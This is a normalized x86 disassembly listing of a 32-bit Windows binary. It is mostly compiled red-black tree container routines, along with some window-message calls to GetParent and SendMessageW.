je r-xdata
sub_425cf0
sub esp 0x8
push ebx
mov ebx [ esp + 0x14 ]
push ebp
push esi
push edi
mov edi eax
mov eax [ edi + 0x18 ]
mov esi [ eax ]
mov eax [ edi ]
test ebx ebx
je r-xdata
call sub_4407b7
mov ebx [ esp + 0x20 ]
cmp ebx eax
je r-xdata
test ebx ebx
je r-xdata
mov ecx [ esp + 0x28 ]
mov esi [ edi + 0x18 ]
mov eax [ edi ]
test ecx ecx
je r-xdata
cmp [ esp + 0x24 ] esi
jne r-xdata
call sub_4407b7
mov ebx [ esp + 0x20 ]
cmp ebx [ esp + 0x28 ]
je r-xdata
call sub_4407b7
mov ebx [ esp + 0x20 ]
cmp ecx eax
je r-xdata
mov edi [ edi ]
mov eax [ esp + 0x1c ]
mov [ eax ] edi
pop edi
pop esi
mov [ eax + 0x4 ] ebp
pop ebp
pop ebx
add esp 0x8
retn 0x14
lea esi [ esp + 0x20 ]
call sub_425c80
push ebp
push ebx
lea eax [ esp + 0x18 ]
push eax
push edi
call sub_4259b0
mov ebx [ esp + 0x20 ]
jmp r-xdata
mov ebp [ esp + 0x24 ]
cmp ebp [ esp + 0x2c ]
je r-xdata
mov ecx [ edi + 0x18 ]
mov edx [ ecx + 0x4 ]
push edx
mov ecx edi
call sub_4258b0
mov eax [ edi + 0x18 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x18 ]
mov [ edi + 0x1c ] 0x0
mov [ eax ] eax
mov eax [ edi + 0x18 ]
mov [ eax + 0x8 ] eax
mov eax [ edi + 0x18 ]
mov ecx [ eax ]
mov eax [ esp + 0x1c ]
mov edx [ edi ]
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x14
cmp [ esp + 0x2c ] esi
jne r-xdata
sub_425dd0
push ebp
mov ebp [ esp + 0x8 ]
push 0x30
push 0x0
push esi
call sub_443360
add esp 0xc
mov [ esi ] 0x30
mov [ esi + 0x4 ] 0x0
test edi edi
jne r-xdata
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] edi
push ebp
call [ GetParent@IAT ]
or [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] ebp
jmp r-xdata
mov ecx [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ esi + 0x20 ] ecx
mov [ esi + 0x24 ] edx
mov [ esi + 0x28 ] 0x0
retn 0x8
mov eax [ ebx ]
mov [ esi + 0x10 ] eax
mov ecx [ ebx + 0x4 ]
mov [ esi + 0x14 ] ecx
mov edx [ ebx + 0x8 ]
mov [ esi + 0x18 ] edx
mov eax [ ebx + 0xc ]
mov [ esi + 0x1c ] eax
pop ebp
test ebx ebx
je r-xdata
sub_425e50
sub esp 0x30
push 0x30
lea eax [ esp + 0x4 ]
push 0x0
push eax
call sub_443360
add esp 0xc
mov [ esp ] 0x30
mov [ esp + 0x4 ] 0x0
test esi esi
jne r-xdata
mov [ esp + 0x8 ] edi
mov [ esp + 0xc ] esi
push edi
call [ GetParent@IAT ]
or [ esp + 0x4 ] 0x1
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edi
jmp r-xdata
mov ecx [ rw-data ]
mov eax [ esp + 0x34 ]
lea edx [ esp ]
push edx
push 0x0
mov [ esp + 0x28 ] ecx
mov ecx [ eax ]
push 0x433
push ecx
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x38 ] 0x0
call [ SendMessageW@IAT ]
add esp 0x30
retn 0x4
sub_425ed0
push ebx
push ebp
mov ebp [ esp + 0xc ]
mov edx [ ebp + 0x18 ]
mov ecx [ edx + 0x4 ]
cmp [ ecx + 0x31 ] 0x0
push esi
push edi
mov ebx edx
jne r-xdata
cmp [ edx + 0x31 ] 0x0
je r-xdata
mov esi [ esp + 0x18 ]
mov edi [ esi ]
lea esp [ esp ]
mov ecx [ edx ]
mov ecx [ ebp + 0x18 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
cmp [ edx + 0x31 ] 0x0
je r-xdata
mov ecx [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ ebp ]
pop edi
pop esi
pop ebp
mov [ eax + 0x4 ] ebx
mov [ eax ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] edx
pop ebx
retn 0x8
mov esi [ esp + 0x18 ]
mov esi [ esi ]
mov edi edi
cmp [ ecx + 0x31 ] 0x0
jne r-xdata
mov ebx ecx
mov ecx [ ecx ]
cmp edi esi
jae r-xdata
cmp [ ecx + 0x31 ] 0x0
je r-xdata
mov ecx [ ecx + 0x8 ]
mov edx ecx
mov ecx [ ecx ]
jmp r-xdata
mov esi [ ecx + 0xc ]
cmp esi edi
jae r-xdata
mov edx ecx
cmp esi [ ecx + 0xc ]
jae r-xdata
cmp [ ecx + 0x31 ] 0x0
je r-xdata
sub_425f60
sub esp 0x10
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebx
mov ebx [ esp + 0x20 ]
push ebp
mov ebp [ esp + 0x28 ]
push esi
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] ecx
mov edi edi
call sub_4407b7
cmp eax ebx
je r-xdata
pop esi
pop ebp
pop ebx
add esp 0x10
retn
inc [ edi ]
lea esi [ esp + 0x10 ]
call sub_426a40
mov eax [ esp + 0x10 ]
jmp r-xdata
cmp [ esp + 0x14 ] ebp
je r-xdata
test eax eax
je r-xdata
sub_425fb0
push 0xffffffff
push sub_45ad18
mov eax [ fs : 0x0 ]
push eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x14 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov ebp [ esp + 0x24 ]
cmp [ ebp + 0x31 ] 0x0
mov edi ebp
jne r-xdata
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn 0x4
mov eax [ edi + 0x8 ]
push eax
mov ecx ebx
call sub_425fb0
mov edi [ edi ]
lea esi [ ebp + 0x10 ]
mov [ esp + 0x24 ] esi
mov [ esp + 0x1c ] 0x0
call sub_426630
mov [ esp + 0x1c ] 0xffffffff
mov ecx [ esi ]
push ecx
call sub_43f960
add esp 0x4
push ebp
call sub_43f960
add esp 0x4
cmp [ edi + 0x31 ] 0x0
mov ebp edi
je r-xdata
sub_426060
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ eax ]
cmp [ edx + 0x31 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x4 ]
mov edx [ edx + 0x18 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
mov [ edx ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
sub_4260b0
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx ] edx
mov edx [ eax + 0x8 ]
cmp [ edx + 0x31 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x4 ]
mov edx [ edx + 0x18 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
mov [ edx ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
sub_426100
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
cmp [ edi + 0x15 ] 0x0
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_426100
mov esi [ esi ]
push edi
call sub_43f960
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov edi esi
je r-xdata
sub_426160
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0x24 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x24 ] 0xf
mov [ esi + 0x20 ] eax
mov [ esi + 0x10 ] al
mov ecx esi
pop esi
jmp sub_43fb60
mov eax [ esi + 0x10 ]
push eax
call sub_43f960
add esp 0x4
sub_4261c0
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx ] edx
mov edx [ eax + 0x8 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x4 ]
mov edx [ edx + 0x18 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
mov [ edx ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
sub_426210
push 0xffffffff
push sub_459b68
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x68 ]
mov eax [ esp + 0x74 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ebx eax
lea esi [ esp + 0x70 ]
mov [ esp + 0x68 ] ebx
call sub_4264e0
mov ecx [ ebx ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
push 0x1b
xor esi esi
push r--data
lea ecx [ esp + 0x1c ]
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] esi
mov [ esp + 0x20 ] 0x0
call sub_42a180
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x34 ]
mov [ esp + 0x64 ] esi
call sub_4296c0
push r--data
lea ecx [ esp + 0x34 ]
push ecx
mov [ esp + 0x38 ] r--data
call sub_442eab
mov edx [ ebx + 0x8 ]
cmp [ edx + 0x15 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ esp + 0x74 ]
mov edi [ eax + 0x8 ]
lea edx [ eax + 0x8 ]
cmp eax ebx
jne r-xdata
mov edi ecx
jmp r-xdata
cmp [ edi + 0x15 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ ebx ]
mov [ eax ] ecx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x18 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x15 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov ecx [ ebx + 0x8 ]
mov [ edx ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp + 0x18 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov edx [ ebp + 0x18 ]
cmp [ edx ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ebx [ ebp + 0x18 ]
mov eax [ esp + 0x68 ]
cmp [ ebx + 0x8 ] eax
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov [ eax + 0x4 ] ecx
lea ecx [ ebx + 0x14 ]
add eax 0x14
cmp eax ecx
je r-xdata
mov edx [ esp + 0x68 ]
mov bl 0x1
cmp [ edx + 0x14 ] bl
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov eax [ edi ]
cmp [ eax + 0x15 ] 0x0
mov ecx edi
jne r-xdata
mov ecx esi
jmp r-xdata
mov bl [ ecx ]
mov dl [ eax ]
mov [ eax ] bl
mov [ ecx ] dl
mov ecx [ esp + 0x68 ]
push ecx
call sub_43f960
mov eax [ ebp + 0x1c ]
add esp 0x4
test eax eax
jbe r-xdata
mov eax [ ebp + 0x18 ]
cmp edi [ eax + 0x4 ]
je r-xdata
mov eax edi
call sub_4122b0
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov [ edx ] ecx
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov edx [ esp + 0x6c ]
mov eax [ esp + 0x74 ]
mov ecx [ ebp ]
mov [ edx + 0x4 ] eax
mov [ edx ] ecx
mov eax edx
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x50
retn 0x10
dec eax
mov [ ebp + 0x1c ] eax
mov [ edi + 0x14 ] bl
nop
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ ecx + 0x14 ] bl
push ebp
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_4261c0
mov ecx [ esi ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ ecx + 0x14 ] bl
push ebp
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_412190
mov ecx [ esi + 0x8 ]
mov ecx [ ebp + 0x18 ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ ecx + 0x4 ]
jne r-xdata
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x14 ] bl
jne r-xdata
mov edx [ ecx ]
cmp [ edx + 0x14 ] bl
jne r-xdata
cmp [ edi + 0x14 ] bl
jne r-xdata
jmp r-xdata
mov edx [ ecx ]
cmp [ edx + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x14 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
je r-xdata
mov dl [ esi + 0x14 ]
mov [ ecx + 0x14 ] dl
mov [ esi + 0x14 ] bl
mov eax [ ecx ]
push ebp
mov ecx esi
mov [ eax + 0x14 ] bl
call sub_4261c0
mov eax [ ecx + 0x8 ]
mov [ eax + 0x14 ] bl
push ebp
mov [ ecx + 0x14 ] 0x0
call sub_412190
mov ecx [ esi ]
mov [ ecx + 0x14 ] 0x0
mov dl [ esi + 0x14 ]
mov [ ecx + 0x14 ] dl
mov [ esi + 0x14 ] bl
mov eax [ ecx + 0x8 ]
push ebp
mov ecx esi
mov [ eax + 0x14 ] bl
call sub_412190
jmp r-xdata
mov eax [ ecx ]
mov [ eax + 0x14 ] bl
push ebp
mov [ ecx + 0x14 ] 0x0
call sub_4261c0
mov ecx [ esi + 0x8 ]
sub_4264e0
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
call sub_4407b7
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
jmp sub_4407b7
mov eax [ eax + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ esi + 0x4 ] eax
retn
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
retn
lea esp [ esp ]
mov [ esi + 0x4 ] eax
mov edx eax
mov eax [ edx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_426550
sub esp 0x8
push ebx
mov ebx [ esp + 0x14 ]
push ebp
push esi
push edi
mov edi eax
mov eax [ edi + 0x18 ]
mov esi [ eax ]
mov eax [ edi ]
test ebx ebx
je r-xdata
call sub_4407b7
mov ebx [ esp + 0x20 ]
cmp ebx eax
je r-xdata
test ebx ebx
je r-xdata
mov ecx [ esp + 0x28 ]
mov esi [ edi + 0x18 ]
mov eax [ edi ]
test ecx ecx
je r-xdata
cmp [ esp + 0x24 ] esi
jne r-xdata
call sub_4407b7
mov ebx [ esp + 0x20 ]
cmp ebx [ esp + 0x28 ]
je r-xdata
call sub_4407b7
mov ebx [ esp + 0x20 ]
cmp ecx eax
je r-xdata
mov edi [ edi ]
mov eax [ esp + 0x1c ]
mov [ eax ] edi
pop edi
pop esi
mov [ eax + 0x4 ] ebp
pop ebp
pop ebx
add esp 0x8
retn 0x14
lea esi [ esp + 0x20 ]
call sub_4264e0
push ebp
push ebx
lea eax [ esp + 0x18 ]
push eax
push edi
call sub_426210
mov ebx [ esp + 0x20 ]
jmp r-xdata
mov ebp [ esp + 0x24 ]
cmp ebp [ esp + 0x2c ]
je r-xdata
mov ecx [ edi + 0x18 ]
mov edx [ ecx + 0x4 ]
push edx
mov ecx edi
call sub_426100
mov eax [ edi + 0x18 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x18 ]
mov [ edi + 0x1c ] 0x0
mov [ eax ] eax
mov eax [ edi + 0x18 ]
mov [ eax + 0x8 ] eax
mov eax [ edi + 0x18 ]
mov ecx [ eax ]
mov eax [ esp + 0x1c ]
mov edx [ edi ]
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x14
cmp [ esp + 0x2c ] esi
jne r-xdata
sub_426630
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ esi + 0x18 ]
mov ecx [ esi ]
mov edx [ eax ]
sub esp 0x8
push eax
push ecx
push edx
push ecx
lea eax [ esp + 0x10 ]
push eax
mov eax esi
call sub_426550
mov ecx [ esi + 0x18 ]
push ecx
call sub_43f960
add esp 0x4
xor eax eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov esp ebp
pop ebp
retn
sub_426670
push 0xffffffff
push sub_45a938
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x1c ]
mov [ esp + 0x14 ] 0x0
call sub_426630
mov eax [ esi ]
push eax
call sub_43f960
add esp 0x4
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x10
retn 0x4
sub_4266d0
push 0xffffffff
push sub_45abf8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov esi ecx
add esi 0x4
mov [ esp + 0xc ] esi
mov [ esp + 0x18 ] 0x0
call sub_426630
mov eax [ esi ]
push eax
call sub_43f960
add esp 0x4
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x14
retn
sub_426730
push 0xffffffff
push sub_45ad50
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x60 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x7c ]
cmp [ eax + 0x31 ] 0x0
je r-xdata
lea esi [ esp + 0x78 ]
mov ebp eax
call sub_426a40
mov ecx [ ebp ]
cmp [ ecx + 0x31 ] 0x0
je r-xdata
push 0x1b
xor esi esi
push r--data
lea ecx [ esp + 0x24 ]
mov [ esp + 0x3c ] 0xf
mov [ esp + 0x38 ] esi
mov [ esp + 0x28 ] 0x0
call sub_42a180
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x3c ]
mov [ esp + 0x6c ] esi
call sub_4296c0
push r--data
lea ecx [ esp + 0x3c ]
push ecx
mov [ esp + 0x40 ] r--data
call sub_442eab
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x31 ] 0x0
je r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
mov eax [ esp + 0x7c ]
mov edi [ eax + 0x8 ]
lea edx [ eax + 0x8 ]
cmp eax ebp
jne r-xdata
mov edi ecx
jmp r-xdata
cmp [ edi + 0x31 ] 0x0
mov esi [ ebp + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ ebp ]
mov [ eax ] ecx
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov ecx [ esp + 0x70 ]
mov eax [ ecx + 0x18 ]
cmp [ eax + 0x4 ] ebp
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x31 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebp
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov ecx [ ebp + 0x8 ]
mov [ edx ] ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ esp + 0x70 ]
mov ecx [ ecx + 0x18 ]
cmp [ ecx + 0x4 ] ebp
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov edx [ ecx + 0x18 ]
cmp [ edx ] ebp
jne r-xdata
mov ecx [ ebp + 0x4 ]
cmp [ ecx ] ebp
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov eax [ esp + 0x70 ]
mov ebx [ eax + 0x18 ]
cmp [ ebx + 0x8 ] ebp
jne r-xdata
cmp [ edi + 0x31 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov edx [ ebp + 0x4 ]
mov [ eax + 0x4 ] edx
lea ecx [ ebp + 0x30 ]
add eax 0x30
cmp eax ecx
je r-xdata
mov ebx 0x1
cmp [ ebp + 0x30 ] bl
jne r-xdata
cmp [ edi + 0x31 ] 0x0
je r-xdata
mov eax [ edi ]
cmp [ eax + 0x31 ] 0x0
mov ecx edi
jne r-xdata
mov ecx esi
jmp r-xdata
mov bl [ ecx ]
mov dl [ eax ]
mov [ eax ] bl
mov [ ecx ] dl
lea esi [ ebp + 0x10 ]
mov [ esp + 0x18 ] esi
mov [ esp + 0x68 ] ebx
call sub_426630
mov eax [ esi ]
push eax
call sub_43f960
add esp 0x4
push ebp
call sub_43f960
mov ecx [ esp + 0x74 ]
mov eax [ ecx + 0x1c ]
add esp 0x4
test eax eax
jbe r-xdata
mov eax [ esp + 0x70 ]
mov ecx [ eax + 0x18 ]
cmp edi [ ecx + 0x4 ]
je r-xdata
mov eax edi
call sub_426040
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov [ edx ] ecx
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x31 ] 0x0
je r-xdata
mov edx [ esp + 0x74 ]
mov eax [ esp + 0x7c ]
mov ecx [ ecx ]
mov [ edx + 0x4 ] eax
mov [ edx ] ecx
mov eax edx
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x58
retn 0x10
dec eax
mov [ ecx + 0x1c ] eax
mov [ edi + 0x30 ] bl
cmp [ edi + 0x30 ] bl
jne r-xdata
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0x30 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x30 ] 0x0
jne r-xdata
cmp [ ecx + 0x31 ] 0x0
jne r-xdata
mov eax [ esp + 0x70 ]
mov [ ecx + 0x30 ] bl
push eax
mov ecx esi
mov [ esi + 0x30 ] 0x0
call sub_4260b0
mov ecx [ esi ]
cmp [ ecx + 0x31 ] 0x0
jne r-xdata
mov edx [ esp + 0x70 ]
mov [ ecx + 0x30 ] bl
push edx
mov ecx esi
mov [ esi + 0x30 ] 0x0
call sub_426060
mov ecx [ esi + 0x8 ]
mov ecx [ esp + 0x70 ]
mov edx [ ecx + 0x18 ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ edx + 0x4 ]
jne r-xdata
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x30 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x30 ] bl
jne r-xdata
jmp r-xdata
mov edx [ ecx ]
cmp [ edx + 0x30 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x30 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x30 ] bl
jne r-xdata
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x30 ] bl
je r-xdata
mov al [ esi + 0x30 ]
mov edx [ esp + 0x70 ]
mov [ ecx + 0x30 ] al
mov [ esi + 0x30 ] bl
mov ecx [ ecx ]
mov [ ecx + 0x30 ] bl
push edx
mov ecx esi
call sub_4260b0
mov eax [ ecx + 0x8 ]
mov edx [ esp + 0x70 ]
mov [ eax + 0x30 ] bl
push edx
mov [ ecx + 0x30 ] 0x0
call sub_426060
mov ecx [ esi ]
mov [ ecx + 0x30 ] 0x0
mov dl [ esi + 0x30 ]
mov [ ecx + 0x30 ] dl
mov [ esi + 0x30 ] bl
mov eax [ ecx + 0x8 ]
mov ecx [ esp + 0x70 ]
push ecx
mov ecx esi
mov [ eax + 0x30 ] bl
call sub_426060
jmp r-xdata
mov edx [ ecx ]
mov eax [ esp + 0x70 ]
mov [ edx + 0x30 ] bl
push eax
mov [ ecx + 0x30 ] 0x0
call sub_4260b0
mov ecx [ esi + 0x8 ]
sub_426a40
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x31 ] 0x0
je r-xdata
call sub_4407b7
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x31 ] 0x0
jne r-xdata
jmp sub_4407b7
mov eax [ eax + 0x4 ]
cmp [ eax + 0x31 ] 0x0
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x31 ] 0x0
jne r-xdata
mov [ esi + 0x4 ] eax
retn
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
retn
lea esp [ esp ]
mov [ esi + 0x4 ] eax
mov edx eax
mov eax [ edx + 0x4 ]
cmp [ eax + 0x31 ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x31 ] 0x0
je r-xdata
sub_426ab0
sub esp 0x8
push ebx
mov ebx [ esp + 0x14 ]
push ebp
push esi
push edi
mov edi eax
mov eax [ edi + 0x18 ]
mov esi [ eax ]
mov eax [ edi ]
test ebx ebx
je r-xdata
call sub_4407b7
mov ebx [ esp + 0x20 ]
cmp ebx eax
je r-xdata
test ebx ebx
je r-xdata
mov ecx [ esp + 0x28 ]
mov esi [ edi + 0x18 ]
mov eax [ edi ]
test ecx ecx
je r-xdata
cmp [ esp + 0x24 ] esi
jne r-xdata
call sub_4407b7
mov ebx [ esp + 0x20 ]
cmp ebx [ esp + 0x28 ]
je r-xdata
call sub_4407b7
mov ebx [ esp + 0x20 ]
cmp ecx eax
je r-xdata
mov edi [ edi ]
mov eax [ esp + 0x1c ]
mov [ eax ] edi
pop edi
pop esi
mov [ eax + 0x4 ] ebp
pop ebp
pop ebx
add esp 0x8
retn 0x14
lea esi [ esp + 0x20 ]
call sub_426a40
push ebp
push ebx
lea eax [ esp + 0x18 ]
push eax
push edi
call sub_426730
mov ebx [ esp + 0x20 ]
jmp r-xdata
mov ebp [ esp + 0x24 ]
cmp ebp [ esp + 0x2c ]
je r-xdata
mov ecx [ edi + 0x18 ]
mov edx [ ecx + 0x4 ]
push edx
mov ecx edi
call sub_425fb0
mov eax [ edi + 0x18 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x18 ]
mov [ edi + 0x1c ] 0x0
mov [ eax ] eax
mov eax [ edi + 0x18 ]
mov [ eax + 0x8 ] eax
mov eax [ edi + 0x18 ]
mov ecx [ eax ]
mov eax [ esp + 0x1c ]
mov edx [ edi ]
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x14
cmp [ esp + 0x2c ] esi
jne r-xdata
sub_426b90
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x3c
push ebx
push esi
push edi
mov ebx eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ esp + 0x24 ]
lea edi [ ebx + 0x20 ]
push ecx
mov [ esp + 0x18 ] edi
call sub_425740
mov edx [ edi + 0x18 ]
mov esi [ esp + 0x20 ]
mov edi [ edi ]
mov [ esp + 0x1c ] edx
